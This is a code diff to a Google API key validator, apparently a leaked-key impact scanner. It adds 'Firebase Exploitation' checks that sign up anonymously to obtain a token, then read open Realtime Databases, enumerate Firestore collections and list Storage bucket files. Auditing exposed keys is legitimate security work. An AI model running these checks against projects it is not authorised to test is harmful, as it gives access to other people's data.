@@ -147,21 +147,261 @@ class GoogleAPIValidator {
 
   async testFirebaseAuthAPI() {
     const url = `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${this.apiKey}`;
-    const result = await this.testAPI('Firebase Auth (Identity Toolkit)', url, {
-      method: 'POST',
-      body: {},
-      contentType: 'application/json'
-    });
 
-    // 400 = enabled (missing email/password expected)
-    if (result.code === 400) {
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ returnSecureToken: true })
+      });
+      const data = await response.json();
+
+      if (response.status === 200 && data.idToken) {
+        return {
+          service: 'Firebase Auth (Identity Toolkit)',
+          status: 'ENABLED',
+          code: 200,
+          message: 'Anonymous signup enabled - obtained idToken',
+          impact: 'CRITICAL',
+          cost: 'LOW',
+          anonymousToken: data.idToken,
+          localId: data.localId,
+          details: { authType: 'anonymous', tokenObtained: true }
+        };
+      }
+
+      if (response.status === 400) {
+        const errorCode = data.error?.message || '';
+        if (errorCode.includes('ADMIN_ONLY_OPERATION')) {
+          return { service: 'Firebase Auth (Identity Toolkit)', status: 'ENABLED (Signup Disabled)', code: 400,
+            message: 'API active but anonymous/email signup disabled by admin', impact: 'LOW', cost: 'LOW' };
+        }
+        return { service: 'Firebase Auth (Identity Toolkit)', status: 'ENABLED', code: 400,
+          message: 'API enabled (anonymous auth may be disabled)', impact: 'HIGH', cost: 'LOW' };
+      }
+
+      return { service: 'Firebase Auth (Identity Toolkit)', status: 'DISABLED', code: response.status,
+        message: data.error?.message || 'API key not valid for Identity Toolkit', impact: 'LOW', cost: 'LOW' };
+    } catch (error) {
+      return { service: 'Firebase Auth (Identity Toolkit)', status: 'ERROR', code: 0, message: error.message };
+    }
+  }
+
+  async testFirebaseRealtimeDB(projectId, idToken = null) {
+    if (!projectId) {
       return {
-        ...result,
-        status: 'ENABLED',
-        message: 'API is enabled (missing credentials expected)'
+        service: 'Firebase Realtime Database',
+        status: 'SKIPPED',
+        message: 'Requires project ID (extract from Firebase config or run Resource Manager)',
+        impact: 'CRITICAL',
+        cost: 'LOW'
       };
     }
-    return result;
+
+    const urls = [
+      `https://${projectId}-default-rtdb.firebaseio.com/.json`,
+      `https://${projectId}.firebaseio.com/.json`
+    ];
+
+    for (const dbUrl of urls) {
+      try {
+        // Step 1: Unauthenticated access
+        const response = await fetch(dbUrl);
+        if (response.status === 200) {
+          const data = await response.json();
+          if (data !== null) {
+            // Fully open database
+            let topLevelKeys = [];
+            try {
+              const shallowResp = await fetch(dbUrl.replace('.json', '.json?shallow=true'));
+              if (shallowResp.status === 200) {
+                const shallowData = await shallowResp.json();
+                topLevelKeys = shallowData ? Object.keys(shallowData) : [];
+              }
+            } catch (e) { /* shallow query failed, not critical */ }
+
+            return {
+              service: 'Firebase Realtime Database',
+              status: 'ENABLED',
+              code: 200,
+              message: `Database is publicly readable without authentication`,
+              impact: 'CRITICAL',
+              cost: 'LOW',
+              details: { accessLevel: 'OPEN', topLevelKeys, databaseUrl: dbUrl.replace('/.json', '') }
+            };
+          }
+        }
+
+        // Step 2: Authenticated access (if we have a token)
+        if ((response.status === 401 || response.status === 403) && idToken) {
+          const authResponse = await fetch(`${dbUrl}?auth=${idToken}`);
+          if (authResponse.status === 200) {
+            const authData = await authResponse.json();
+            if (authData !== null) {
+              let topLevelKeys = [];
+              try {
+                const shallowResp = await fetch(`${dbUrl.replace('.json', '.json')}?shallow=true&auth=${idToken}`);
+                if (shallowResp.status === 200) {
+                  const shallowData = await shallowResp.json();
+                  topLevelKeys = shallowData ? Object.keys(shallowData) : [];
+                }
+              } catch (e) { /* shallow query failed */ }
+
+              return {
+                service: 'Firebase Realtime Database',
+                status: 'ENABLED',
+                code: 200,
+                message: 'Database readable with anonymous auth token (auth != null misconfiguration)',
+                impact: 'HIGH',
+                cost: 'LOW',
+                details: { accessLevel: 'AUTHENTICATED', topLevelKeys, databaseUrl: dbUrl.replace('/.json', '') }
+              };
+            }
+          }
+        }
+
+        // If we got a 404, this URL variant doesn't exist -- try the next one
+        if (response.status === 404) continue;
+
+        // If we got 401/403 without a token or auth also failed, DB is secured
+        return {
+          service: 'Firebase Realtime Database',
+          status: 'DISABLED',
+          code: response.status,
+          message: 'Database properly secured (requires valid authentication)',
+          impact: 'LOW',
+          cost: 'LOW',
+          details: { accessLevel: 'SECURED', databaseUrl: dbUrl.replace('/.json', '') }
+        };
+      } catch (error) {
+        // Network error on this URL -- try the next variant
+        continue;
+      }
+    }
+
+    return {
+      service: 'Firebase Realtime Database',
+      status: 'ERROR',
+      code: 0,
+      message: 'Could not reach any database URL for this project',
+      impact: 'LOW',
+      cost: 'LOW'
+    };
+  }
+
+  async testFirestoreAPI(projectId) {
+    if (!projectId) {
+      return {
+        service: 'Cloud Firestore',
+        status: 'SKIPPED',
+        message: 'Requires project ID',
+        impact: 'CRITICAL',
+        cost: 'LOW'
+      };
+    }
+
+    const url = `https://firestore.googleapis.com/v1/projects/${projectId}/databases/(default)/documents?key=${this.apiKey}`;
+    try {
+      const response = await fetch(url);
+      if (response.status === 200) {
+        const data = await response.json();
+        const collections = (data.documents || []).map(d => {
+          const parts = d.name.split('/');
+          // Collection is the second-to-last path segment
+          return parts.length >= 2 ? parts[parts.length - 2] : d.name;
+        });
+        const uniqueCollections = [...new Set(collections)];
+        return {
+          service: 'Cloud Firestore',
+          status: 'ENABLED',
+          code: 200,
+          message: `Firestore publicly readable - found ${uniqueCollections.length} collection(s)`,
+          impact: 'CRITICAL',
+          cost: 'LOW',
+          details: { collections: uniqueCollections }
+        };
+      }
+      return {
+        service: 'Cloud Firestore',
+        status: 'DISABLED',
+        code: response.status,
+        message: 'Firestore properly secured',
+        impact: 'LOW',
+        cost: 'LOW'
+      };
+    } catch (error) {
+      return { service: 'Cloud Firestore', status: 'ERROR', code: 0, message: error.message };
+    }
+  }
+
+  async testFirebaseStorageBucket(projectId) {
+    if (!projectId) {
+      return {
+        service: 'Firebase Storage',
+        status: 'SKIPPED',
+        message: 'Requires project ID',
+        impact: 'HIGH',
+        cost: 'LOW'
+      };
+    }
+
+    const url = `https://firebasestorage.googleapis.com/v0/b/${projectId}.appspot.com/o?maxResults=10`;
+    try {
+      const response = await fetch(url);
+      if (response.status === 200) {
+        const data = await response.json();
+        const items = data.items || [];
+        if (items.length > 0) {
+          const sampleFiles = items.slice(0, 5).map(i => i.name);
+          return {
+            service: 'Firebase Storage',
+            status: 'ENABLED',
+            code: 200,
+            message: `Storage bucket publicly listable - ${items.length} file(s) found`,
+            impact: 'HIGH',
+            cost: 'LOW',
+            details: { itemCount: items.length, sampleFiles }
+          };
+        }
+        return {
+          service: 'Firebase Storage',
+          status: 'ENABLED',
+          code: 200,
+          message: 'Storage bucket accessible but empty',
+          impact: 'MEDIUM',
+          cost: 'LOW'
+        };
+      }
+      return {
+        service: 'Firebase Storage',
+        status: 'DISABLED',
+        code: response.status,
+        message: 'Storage bucket properly secured',
+        impact: 'LOW',
+        cost: 'LOW'
+      };
+    } catch (error) {
+      return { service: 'Firebase Storage', status: 'ERROR', code: 0, message: error.message };
+    }
+  }
+
+  async testFirebaseSuite(projectId) {
+    // Auth runs first (sequential dependency for idToken)
+    const authResult = await this.testFirebaseAuthAPI();
+    const idToken = authResult.anonymousToken || null;
+
+    const results = [authResult];
+
+    if (projectId) {
+      const [dbResult, firestoreResult, storageResult] = await Promise.all([
+        this.testFirebaseRealtimeDB(projectId, idToken),
+        this.testFirestoreAPI(projectId),
+        this.testFirebaseStorageBucket(projectId)
+      ]);
+      results.push(dbResult, firestoreResult, storageResult);
+    }
+
+    return results;
   }
 
   async testTranslationAPI() {
@@ -446,21 +686,23 @@ class GoogleAPIValidator {
     return await Promise.all(tests);
   }
 
-  // Full test suite (all 27 APIs)
+  // Full test suite (all 30 APIs)
   async runAllTests() {
-    // First test Resource Manager to discover project IDs
+    // Sequential: Resource Manager first (for project IDs), then Firebase Auth (for idToken)
     const resourceManagerResult = await this.testResourceManagerAPI();
     const discoveredProjects = resourceManagerResult.discoveredProjects || [];
     const projectId = discoveredProjects.length > 0 ? discoveredProjects[0].projectId : null;
 
-    // Run all tests (infrastructure tests will use discovered project ID)
+    const firebaseAuthResult = await this.testFirebaseAuthAPI();
+    const idToken = firebaseAuthResult.anonymousToken || null;
+
+    // Run remaining tests in parallel
     const tests = [
-      // Original 15 APIs
+      // Original 14 APIs (firebase-auth already ran above)
       this.testYouTubeAPI(),
       this.testMapsStaticAPI(),
       this.testGeolocationAPI(),
       this.testCustomSearchAPI(),
-      this.testFirebaseAuthAPI(),
       this.testTranslationAPI(),
       this.testBooksAPI(),
       this.testTimezoneAPI(),
@@ -471,7 +713,7 @@ class GoogleAPIValidator {
       this.testElevationAPI(),
       this.testPageSpeedAPI(),
       this.testFontsAPI(),
-      // New AI/ML APIs (7)
+      // AI/ML APIs (7)
       this.testVertexAIAPI(),
       this.testGeminiAPI(),
       this.testVisionAPI(),
@@ -479,17 +721,21 @@ class GoogleAPIValidator {
       this.testVideoIntelligenceAPI(),
       this.testNaturalLanguageAPI(),
       this.testTextToSpeechAPI(),
-      // New Infrastructure APIs (5) - use discovered project ID
+      // Infrastructure APIs (5) - use discovered project ID
       this.testComputeEngineAPI(projectId),
       this.testCloudStorageAPI(projectId),
       this.testSecretManagerAPI(projectId),
-      this.testBigQueryAPI(projectId)
+      this.testBigQueryAPI(projectId),
+      // Firebase Exploitation (3) - use idToken from auth + projectId
+      this.testFirebaseRealtimeDB(projectId, idToken),
+      this.testFirestoreAPI(projectId),
+      this.testFirebaseStorageBucket(projectId)
     ];
 
     const results = await Promise.all(tests);
 
-    // Add Resource Manager result to the beginning
-    return [resourceManagerResult, ...results];
+    // Prepend sequential results
+    return [resourceManagerResult, firebaseAuthResult, ...results];
   }
 
   // Run selected tests based on service IDs (new granular testing)
@@ -527,7 +773,11 @@ class GoogleAPIValidator {
       'compute-engine': () => this.testComputeEngineAPI(projectId),
       'cloud-storage': () => this.testCloudStorageAPI(projectId),
       'secret-manager': () => this.testSecretManagerAPI(projectId),
-      'bigquery': () => this.testBigQueryAPI(projectId)
+      'bigquery': () => this.testBigQueryAPI(projectId),
+      // Firebase Exploitation
+      'firebase-realtime-db': () => this.testFirebaseRealtimeDB(projectId),
+      'firebase-firestore': () => this.testFirestoreAPI(projectId),
+      'firebase-storage': () => this.testFirebaseStorageBucket(projectId)
     };
 
     // If Resource Manager is selected, run it first to discover projects
@@ -543,9 +793,22 @@ class GoogleAPIValidator {
     // Re-create project ID for infrastructure tests if we just discovered new ones
     const updatedProjectId = updatedProjects.length > 0 ? updatedProjects[0].projectId : null;
 
+    // Firebase suite: run auth first to obtain idToken, then chain to DB/Firestore/Storage
+    const firebaseDbServices = ['firebase-realtime-db', 'firebase-firestore', 'firebase-storage'];
+    const hasFirebaseDb = selectedServiceIds.some(id => firebaseDbServices.includes(id));
+    const hasFirebaseAuth = selectedServiceIds.includes('firebase-auth');
+    let savedFirebaseAuthResult = null;
+    let firebaseIdToken = null;
+
+    if (hasFirebaseAuth || hasFirebaseDb) {
+      savedFirebaseAuthResult = await this.testFirebaseAuthAPI();
+      firebaseIdToken = savedFirebaseAuthResult.anonymousToken || null;
+    }
+
     // Build test array based on selected service IDs
+    const sequentialIds = new Set(['resource-manager', 'firebase-auth']);
     const tests = selectedServiceIds
-      .filter(id => id !== 'resource-manager') // Already ran if selected
+      .filter(id => !sequentialIds.has(id)) // Already ran if selected
       .map(id => {
         if (!serviceMap[id]) {
           console.warn(`Unknown service ID: ${id}`);
@@ -553,24 +816,27 @@ class GoogleAPIValidator {
         }
         // For infrastructure APIs, use updated project ID
         if (['compute-engine', 'cloud-storage', 'secret-manager', 'bigquery'].includes(id)) {
-          // Recreate infrastructure API calls with updated project ID
           if (id === 'compute-engine') return this.testComputeEngineAPI(updatedProjectId);
           if (id === 'cloud-storage') return this.testCloudStorageAPI(updatedProjectId);
           if (id === 'secret-manager') return this.testSecretManagerAPI(updatedProjectId);
           if (id === 'bigquery') return this.testBigQueryAPI(updatedProjectId);
         }
+        // For Firebase DB services, use updated project ID and chained idToken
+        if (id === 'firebase-realtime-db') return this.testFirebaseRealtimeDB(updatedProjectId || this._firebaseProjectId, firebaseIdToken);
+        if (id === 'firebase-firestore') return this.testFirestoreAPI(updatedProjectId || this._firebaseProjectId);
+        if (id === 'firebase-storage') return this.testFirebaseStorageBucket(updatedProjectId || this._firebaseProjectId);
         return serviceMap[id]();
       })
       .filter(test => test !== null);
 
     const results = await Promise.all(tests);
 
-    // Add Resource Manager result if it was selected (reuse saved result)
-    if (savedResourceManagerResult) {
-      return [savedResourceManagerResult, ...results];
-    }
+    // Prepend sequential results
+    const prefixResults = [];
+    if (savedResourceManagerResult) prefixResults.push(savedResourceManagerResult);
+    if (savedFirebaseAuthResult && hasFirebaseAuth) prefixResults.push(savedFirebaseAuthResult);
 
-    return results;
+    return [...prefixResults, ...results];
   }
 }
 
